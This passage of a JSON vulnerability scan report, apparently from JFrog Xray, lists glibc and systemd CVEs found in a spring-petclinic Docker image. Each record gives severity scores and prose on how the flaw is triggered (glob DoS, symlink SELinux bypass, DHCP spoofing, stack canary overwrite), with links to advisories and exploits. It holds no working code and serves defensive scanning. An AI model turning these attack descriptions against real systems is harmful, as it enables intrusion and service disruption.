            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2010-4756",
                     "cwe": [
                        "CWE-399"
                     ],
                     "cvss_v2": "4.0/CVSS:2.0/AV:N/AC:L/Au:S/C:N/I:N/A:P"
                  }
               ],
               "description": "The glob implementation in the GNU C Library (aka glibc or libc6) allows remote authenticated users to cause a denial of service (CPU and memory consumption) via crafted glob expressions that do not match any pathnames, as demonstrated by glob expressions in STAT commands to an FTP daemon, a different vulnerability than CVE-2010-2632.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:30:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-33571",
            "VulnerabilityTitle": "",
            "ShortDescription": "An unbounded computation in glibc leads to denial of service when parsing crafted glob expressions.",
            "FullDescription": "The GNU C Library project provides the core libraries for the GNU system and GNU/Linux systems, as well as many other systems that use Linux as the kernel. One of the provided functions is `glob`. *This function expands a filename wildcard which is passed as pattern*. It usually implements a limitation though the `GLOB_LIMIT` constant but a flaw is causing a `denial of service when the crafted glob expression does not match any pathnames`.\nThis vulnerability is very similar to the one affecting the *STAT* commands against an FTP Deamon which gives information about the file and the filesystem, also vulnerable to glob expression causing the process to use 100% of the CPU capabilities for a long time.\nHowever, this vulnerability needs the attacker to be an authenticated user.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has been disputed by the vendor",
                  "Description": "The software maintainer disputes that this is not a vulnerability because the behavior occurs only with a crafted glob pattern. Therefore - this issue is unlikely to get a fix.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Marked as unimportant by the Debian tracker. Computation-based DoS.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote input that propagates into the `pattern` argument of a `glob` call.\nHowever, as the technical [write-up](https://cxsecurity.com/issue/WLB-2010100135) shows, this vulnerability can be remotely exploited in some common cases, such as FTP servers.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "A technical [write-up](https://cxsecurity.com/issue/WLB-2010100135) was published explaining the bug and how to trigger it.",
                  "IsPositive": 0,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "It is unlikely that a remote attacker will be able to control a glob pattern from a remote input",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Information on how to exploit this bug is given in this link",
                  "Url": "https://cxsecurity.com/issue/WLB-2010100135",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://cxsecurity.com/issue/WLB-2010100135",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2010-4756",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-32874",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "systemd, when updating file permissions, allows local users to change the permissions and SELinux security contexts for arbitrary files via a symlink attack on unspecified files.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libudev1",
         "source_id": "deb://debian:bullseye:libudev1",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2013-4392",
                     "cwe": [
                        "CWE-59"
                     ],
                     "cwe_details": {
                        "CWE-59": {
                           "name": "Improper Link Resolution Before File Access ('Link Following')",
                           "description": "The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource."
                        }
                     },
                     "cvss_v2": "3.3/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:P/A:N"
                  }
               ],
               "description": "systemd, when updating file permissions, allows local users to change the permissions and SELinux security contexts for arbitrary files via a symlink attack on unspecified files.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-32874",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper update of SELinux labels in systemd allows root users to bypass SELinux via mount commands.",
            "FullDescription": "[`systemd`](https://systemd.io) is a Linux software suite that provides numerous tools and system components, mainly a system and service manager, who runs on system startup.\n`systemd` before 239 improperly performs [`SELinux`](https://selinuxproject.org/) label updates when mounting drives, which makes it vulnerable to symlink attacks that may result in local privilege escalation. \n\n`SELinux` labels are used for access control, and help manage the access to resources based on user privilege. When `systemd` is required to mount user-specified drives or directories, it recursively updates the `SELinux` labels of the files inside the mounted directory tree, granting privileges to the mounting user to use those files. A vulnerability in `systemd`'s `label_fix` function allows an attacker to perform a symlink attack, in which a symlink to a sensitive resource exists in the mounted directory tree. This would result in the update of the `SELinux` label of the file pointed by the symlink, granting the mounting user privileges to use that resource, effectively bypassing SELinux.",
            "Impact": 5,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "A local attacker must create symbolic links and perform mount commands",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker with high privileges",
                  "Description": "Mounting requires root privileges",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "The issue affects many distributions by default, when SELinux is enabled",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Bypass of SELinux by root users",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://www.openwall.com/lists/oss-security/2013/10/01/9",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/systemd/systemd/pull/8583",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2013-4392",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-32874",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "systemd, when updating file permissions, allows local users to change the permissions and SELinux security contexts for arbitrary files via a symlink attack on unspecified files.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsystemd0",
         "source_id": "deb://debian:bullseye:libsystemd0",
         "source_comp_id": "deb://debian:bullseye:libsystemd0:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2013-4392",
                     "cwe": [
                        "CWE-59"
                     ],
                     "cwe_details": {
                        "CWE-59": {
                           "name": "Improper Link Resolution Before File Access ('Link Following')",
                           "description": "The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource."
                        }
                     },
                     "cvss_v2": "3.3/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:P/A:N"
                  }
               ],
               "description": "systemd, when updating file permissions, allows local users to change the permissions and SELinux security contexts for arbitrary files via a symlink attack on unspecified files.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-32874",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper update of SELinux labels in systemd allows root users to bypass SELinux via mount commands.",
            "FullDescription": "[`systemd`](https://systemd.io) is a Linux software suite that provides numerous tools and system components, mainly a system and service manager, who runs on system startup.\n`systemd` before 239 improperly performs [`SELinux`](https://selinuxproject.org/) label updates when mounting drives, which makes it vulnerable to symlink attacks that may result in local privilege escalation. \n\n`SELinux` labels are used for access control, and help manage the access to resources based on user privilege. When `systemd` is required to mount user-specified drives or directories, it recursively updates the `SELinux` labels of the files inside the mounted directory tree, granting privileges to the mounting user to use those files. A vulnerability in `systemd`'s `label_fix` function allows an attacker to perform a symlink attack, in which a symlink to a sensitive resource exists in the mounted directory tree. This would result in the update of the `SELinux` label of the file pointed by the symlink, granting the mounting user privileges to use that resource, effectively bypassing SELinux.",
            "Impact": 5,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "A local attacker must create symbolic links and perform mount commands",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker with high privileges",
                  "Description": "Mounting requires root privileges",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "The issue affects many distributions by default, when SELinux is enabled",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Bypass of SELinux by root users",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://www.openwall.com/lists/oss-security/2013/10/01/9",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/systemd/systemd/pull/8583",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2013-4392",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-175472",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An exploitable denial-of-service vulnerability exists in Systemd 245. A specially crafted DHCP FORCERENEW packet can cause a server running the DHCP client to be vulnerable to a DHCP ACK spoofing attack. An attacker can forge a pair of FORCERENEW and DCHP ACK packets to reconfigure the server.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libudev1",
         "source_id": "deb://debian:bullseye:libudev1",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2020-13529",
                     "cwe": [
                        "CWE-290"
                     ],
                     "cwe_details": {
                        "CWE-290": {
                           "name": "Authentication Bypass by Spoofing",
                           "description": "This attack-focused weakness is caused by incorrectly implemented authentication schemes that are subject to spoofing attacks."
                        }
                     },
                     "cvss_v2": "2.9/CVSS:2.0/AV:A/AC:M/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "6.1/CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:N/I:N/A:H"
                  }
               ],
               "description": "An exploitable denial-of-service vulnerability exists in Systemd 245. A specially crafted DHCP FORCERENEW packet can cause a server running the DHCP client to be vulnerable to a DHCP ACK spoofing attack. An attacker can forge a pair of FORCERENEW and DCHP ACK packets to reconfigure the server.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-175472",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper packet source validation in systemd's DHCP client may lead to denial of service.",
            "FullDescription": "[`systemd`](https://systemd.io) is a Linux software suite that provides numerous tools and system components, mainly a system and service manager, that runs on system startup. The DHCP client in `systemd` 245 is vulnerable to a packet forging attack which may lead to denial of service.\n\n`systemd`'s DHCP client is vulnerable to a forging attack, allowing an attacker to set the client to `RENEWING` state, by sending the target client a `DHCP FORCERENEW` packet. When `systemd`'s DHCP client starts, it broadcasts a transaction ID to the entire network, which can later be used to communicate with the client. Since `systemd`'s DHCP client doesn't validate the source from which the `DHCP FORCERENEW` packet came from, a malicious actor can set the client to `RENEWING` state, in which the DHCP client will await for its new IP, subnet and lease time assignment. The attacker can then send the target client a `DHCP ACK` packet that contains the desired IP address they wish to set for the target. Thus, an attacker can cause a denial of service by assigning the target with an IP address that will effectively prevent it from communicating with its network.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "Exploitation can be easily performed by local network attackers, without needing to write complex exploit code",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "This vulnerability can be exploited over DHCP (local network attackers)",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by an unauthenticated attacker or an attacker with low privileges",
                  "Description": "Attack can be performed by an unauthenticated attacker",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "systemd's DHCP client is vulnerable to the forging attack by default",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Temporary denial of service",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/systemd/systemd/commit/6222acc2b59309ac6187450d9e65eceb1b7cc1c5",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1142",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2020-13529",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-175472",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An exploitable denial-of-service vulnerability exists in Systemd 245. A specially crafted DHCP FORCERENEW packet can cause a server running the DHCP client to be vulnerable to a DHCP ACK spoofing attack. An attacker can forge a pair of FORCERENEW and DCHP ACK packets to reconfigure the server.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsystemd0",
         "source_id": "deb://debian:bullseye:libsystemd0",
         "source_comp_id": "deb://debian:bullseye:libsystemd0:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2020-13529",
                     "cwe": [
                        "CWE-290"
                     ],
                     "cwe_details": {
                        "CWE-290": {
                           "name": "Authentication Bypass by Spoofing",
                           "description": "This attack-focused weakness is caused by incorrectly implemented authentication schemes that are subject to spoofing attacks."
                        }
                     },
                     "cvss_v2": "2.9/CVSS:2.0/AV:A/AC:M/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "6.1/CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:N/I:N/A:H"
                  }
               ],
               "description": "An exploitable denial-of-service vulnerability exists in Systemd 245. A specially crafted DHCP FORCERENEW packet can cause a server running the DHCP client to be vulnerable to a DHCP ACK spoofing attack. An attacker can forge a pair of FORCERENEW and DCHP ACK packets to reconfigure the server.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-175472",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper packet source validation in systemd's DHCP client may lead to denial of service.",
            "FullDescription": "[`systemd`](https://systemd.io) is a Linux software suite that provides numerous tools and system components, mainly a system and service manager, that runs on system startup. The DHCP client in `systemd` 245 is vulnerable to a packet forging attack which may lead to denial of service.\n\n`systemd`'s DHCP client is vulnerable to a forging attack, allowing an attacker to set the client to `RENEWING` state, by sending the target client a `DHCP FORCERENEW` packet. When `systemd`'s DHCP client starts, it broadcasts a transaction ID to the entire network, which can later be used to communicate with the client. Since `systemd`'s DHCP client doesn't validate the source from which the `DHCP FORCERENEW` packet came from, a malicious actor can set the client to `RENEWING` state, in which the DHCP client will await for its new IP, subnet and lease time assignment. The attacker can then send the target client a `DHCP ACK` packet that contains the desired IP address they wish to set for the target. Thus, an attacker can cause a denial of service by assigning the target with an IP address that will effectively prevent it from communicating with its network.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "Exploitation can be easily performed by local network attackers, without needing to write complex exploit code",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "This vulnerability can be exploited over DHCP (local network attackers)",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by an unauthenticated attacker or an attacker with low privileges",
                  "Description": "Attack can be performed by an unauthenticated attacker",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "systemd's DHCP client is vulnerable to the forging attack by default",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Temporary denial of service",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/systemd/systemd/commit/6222acc2b59309ac6187450d9e65eceb1b7cc1c5",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1142",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2020-13529",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-84860",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass stack guard protection. The component is: nptl. The attack vector is: Exploit stack buffer overflow vulnerability and use this bypass vulnerability to bypass stack guard. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-1010022",
                     "cwe": [
                        "CWE-119"
                     ],
                     "cwe_details": {
                        "CWE-119": {
                           "name": "Improper Restriction of Operations within the Bounds of a Memory Buffer",
                           "description": "The product performs operations on a memory buffer, but it can read from or write to a memory location that is outside of the intended boundary of the buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "17"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "9.8/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass stack guard protection. The component is: nptl. The attack vector is: Exploit stack buffer overflow vulnerability and use this bypass vulnerability to bypass stack guard. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-84860",
            "VulnerabilityTitle": "",
            "ShortDescription": "Insufficient mitigation implementation in glibc's pthread could lead to an attacker bypassing the stack protector/canary mitigation.",
            "FullDescription": "The [GNU C Library](https://www.gnu.org/s/libc/), commonly known as glibc, is the GNU Project's implementation of the C standard library.\n\nA well-known issue leads to the fact that in applications that call `pthread_create()`, if a large stack buffer overflow occurs, the stack overflow may overwrite both the reference value of the stack canary and the canary that's saved inside the stack-frame. This leads to a complete bypass of the \"stack protector\" mitigation.\n\nSpecifically, The stack protector (\"canary\") should protect an application from been exploited by stack-based buffer overflows. It is placed on stack frame in function prologue and checked with some trusted value in the function epilogue.\n\nFor x86 and x86-64 architecture the canary value is located in structure `tcbhead_t` field `stack_guard`. A Special register ('gs' for i386 and 'fs' for x86-64) keeps a pointer to this structure. The value `tcbhead_t.stack_guard` is compared with one on the stack to detect stack smashing.\n\nNPTL (Native POSIX Threads Library) is the GNU C library POSIX threads implementation that is used on modern Linux systems. When a `pthread` (new thread) is created, it will keep the `tcphead_t` structure in the thread stack. Thus, an attacker can overwrite the \"reference\" stack-canary value (since it's saved on the stack) by means of stack overflow in a new thread.\n\nThis vulnerability was disputed by the libc maintainers, since it is a well-known issue and not a standalone vulnerability but rather a vulnerability in a mitigation mechanism.",
            "Impact": 4,
            "VulnerabilityType": "Filter Bypass",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The PoC demonstrates changing the \"retained\" stack-canary value",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has been disputed by the vendor",
                  "Description": "The Libc maintainers treat this issue as a non-security bug, since it is a vulnerability in a post-attack mitigation (not a standalone vulnerability)",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot be exploited on its own, and can only be used as part of an attack chain",
                  "Description": "Exploitation of this issue requires exploiting a different stack-buffer-overflow vulnerability in the target application",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The victim application must call `pthread_create()` and must be vulnerable to a stack-buffer-overflow type of vulnerability",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://sourceware.org/bugzilla/show_bug.cgi?id=22850#c3",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC changing the stack-canary value.",
                  "Url": "https://bases-hacking.org/tcb-overwrite.html",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical write-up",
                  "Url": "https://bases-hacking.org/tcb-overwrite.html",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2019-1010022",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-84860",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass stack guard protection. The component is: nptl. The attack vector is: Exploit stack buffer overflow vulnerability and use this bypass vulnerability to bypass stack guard. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-1010022",
                     "cwe": [
                        "CWE-119"
                     ],
                     "cwe_details": {
                        "CWE-119": {
                           "name": "Improper Restriction of Operations within the Bounds of a Memory Buffer",
                           "description": "The product performs operations on a memory buffer, but it can read from or write to a memory location that is outside of the intended boundary of the buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "17"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "9.8/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass stack guard protection. The component is: nptl. The attack vector is: Exploit stack buffer overflow vulnerability and use this bypass vulnerability to bypass stack guard. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-84860",
            "VulnerabilityTitle": "",
            "ShortDescription": "Insufficient mitigation implementation in glibc's pthread could lead to an attacker bypassing the stack protector/canary mitigation.",
